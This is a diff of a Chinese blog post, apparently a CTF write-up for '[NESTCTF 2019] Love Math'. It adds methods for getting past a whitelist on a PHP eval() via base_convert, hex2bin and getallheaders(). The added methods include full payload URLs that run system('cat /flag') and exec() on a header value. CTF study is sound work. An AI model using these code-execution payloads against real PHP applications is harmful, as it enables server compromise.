@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="刷题笔记:[NESTCTF 2019]Love Math 2, 远离尘世的幻想乡">
+    <meta name="keywords" content="刷题笔记:[NESTCTF 2019]Love Math, 远离尘世的幻想乡">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>刷题笔记:[NESTCTF 2019]Love Math 2 | 远离尘世的幻想乡</title>
+    <title>刷题笔记:[NESTCTF 2019]Love Math | 远离尘世的幻想乡</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -364,12 +364,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/81.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/34.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">刷题笔记:[NESTCTF 2019]Love Math 2</h1>
+                    <h1 class="description center-align post-title">刷题笔记:[NESTCTF 2019]Love Math</h1>
                 </div>
             </div>
         </div>
@@ -525,21 +525,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-02
+                    2021-11-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    502
+                    931
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -586,7 +586,7 @@
     <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>白名单制，给了很多数学函数，思路类似于构造所以可以考虑用这些数学函数通过<strong>异或</strong>/<strong>取反</strong>来构造成想要的字符。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法1-异或-取反"><a href="#方法1-异或-取反" class="headerlink" title="方法1 异或/取反"></a>方法1 异或/取反</h3><p>白名单制，给了很多数学函数，思路类似于构造所以可以考虑用这些数学函数通过<strong>异或</strong>/<strong>取反</strong>来构造成想要的字符。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -622,6 +622,44 @@
 
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20210902185216015.png"></p>
 <p>需要字符串异或才行，所以将数字以括号分割。</p>
+<h3 id="方法2-进制转换"><a href="#方法2-进制转换" class="headerlink" title="方法2 进制转换"></a>方法2 进制转换</h3><p>利用进制间的转换，使用<code>hex2bin()</code>函数，<code>hex2bin()</code>函数把十六进制值的字符串转换为 <strong>ASCII</strong>字符。</p>
+<p>1.首先将<code>hex2bin</code>转换为<strong>十进制</strong>：<code>base_convert(&#39;hex2bin&#39;,36,10);</code>，得到<code>37907361743</code>。注意这里是36-&gt;10。</p>
+<p>2.将<code>_GET</code>转换为<strong>十六进制</strong>：<code>5f474554</code></p>
+<p>3.再由<code>hex2bin()</code>函数将<strong>十六进制转换为ASCII</strong>字符：<code>base_convert(37907361743,10,36)(dechex(1598506324));</code> 注意这里是10-&gt;36。</p>
+<blockquote>
+<p>其中<strong>三十六进制</strong>中，有数字字母可满足白名单。</p>
+</blockquote>
+<p>利用php中动态函数特性，也就是把函数名通过字符串传递给一个变量，然后通过此变量动态调用函数。<br>此时变量<code>$pi=&#39;_GET&#39;</code>继续构造<strong>GET</strong>传参：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token comment">// 等价于</span>
+<span class="token variable">$_GET</span><span class="token punctuation">[</span>pi<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>abs<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为<code>[]</code>在黑名单中，所以使用<code>&#123;&#125;</code>代替。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">pi<span class="token operator">=</span>system
+abs<span class="token operator">=</span>cat <span class="token operator">/</span>flag
+
+<span class="token comment">// 被拼接为</span>
+<span class="token function">system</span><span class="token punctuation">(</span>cat <span class="token operator">/</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>abs<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="方法3-header传参"><a href="#方法3-header传参" class="headerlink" title="方法3 header传参"></a>方法3 header传参</h3><p><code>getallheaders()</code>函数，获取全部 HTTP 请求头信息，利用<strong>header</strong>传参<br><code>getallheader()</code>函数返回的是格式为<strong>数组</strong>，但因<code>[]</code>在黑名单中无法使用，所以采用<code>getallheader()&#123;1&#125;</code>返回自定义头<code>1</code>里面的内容</p>
+<p>同样是使用<code>base_convert()</code>函数，与方法2同理</p>
+<p>1.首先将<code>exec</code>转换为<code>10</code>进制：<code>base_convert(&#39;exec&#39;,36,10);</code>，得到<code>696468</code></p>
+<p>2.再将<code>getallheaders</code>转化：<code>base_convert(&#39;getallheaders&#39;,30,10)</code>，得到<code>8768397090111664438</code></p>
+<p>3.将变量<code>$pi</code>动态调用<code>base_convert()</code>函数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token comment">// 等价于</span>
+<span class="token function">exec</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>抓包，添加请求头信息</p>
+<pre class="line-numbers language-none"><code class="language-none">1: cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NESTCTF-2019-Love-Math-2/image-20211102201959037.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111868053">https://blog.csdn.net/weixin_44037296/article/details/111868053</a></p>
 
                 
             </div>
